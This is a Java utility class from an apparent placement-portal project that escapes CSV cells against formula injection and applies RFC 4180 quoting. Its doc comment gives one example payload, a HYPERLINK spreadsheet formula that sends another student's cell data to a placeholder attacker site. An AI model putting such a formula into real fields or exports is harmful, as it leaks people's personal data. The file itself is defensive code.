package com.placementhub.common;

import java.util.List;
import java.util.stream.Collectors;

/**
 * Builds CSV text safely. Two separate protections, applied to every cell:
 *
 * 1. CSV injection (formula injection): a cell starting with = + - @ (or tab / carriage return) is run as a
 *    FORMULA by Excel and similar programs when the TPO opens the file. A student could set their name to
 *    =HYPERLINK("http://evil.site/?d="&C2,"Click") and leak other students' data. A leading ' makes it text.
 * 2. RFC 4180 quoting: a cell with a comma, a double quote or a line break is wrapped in double quotes,
 *    and inner double quotes are doubled, so the cell can't spill into the next column or row.
 *
 * Every column is escaped the same way, including phone numbers ("+91..." becomes "'+91..."); see decisions.md.
 */
public final class CsvWriter {

	/** Excel and Google Sheets want CRLF line endings (RFC 4180). */
	public static final String LINE_END = "\r\n";

	/** A UTF-8 byte order mark: without it, Excel on Windows misreads non-ASCII characters in names. */
	public static final String UTF8_BOM = "﻿";

	private CsvWriter() {
	}

	/** One CSV line (with its CRLF). */
	public static String row(List<String> cells) {
		return cells.stream().map(CsvWriter::cell).collect(Collectors.joining(",")) + LINE_END;
	}

	/** One escaped cell. null becomes an empty cell. */
	public static String cell(String value) {
		if (value == null || value.isEmpty()) {
			return "";
		}
		String safe = startsLikeAFormula(value) ? "'" + value : value;
		if (needsQuotes(safe)) {
			return "\"" + safe.replace("\"", "\"\"") + "\"";
		}
		return safe;
	}

	static boolean startsLikeAFormula(String value) {
		char first = value.charAt(0);
		return first == '=' || first == '+' || first == '-' || first == '@' || first == '\t' || first == '\r';
	}

	private static boolean needsQuotes(String value) {
		return value.indexOf(',') >= 0 || value.indexOf('"') >= 0 || value.indexOf('\n') >= 0
				|| value.indexOf('\r') >= 0;
	}

}
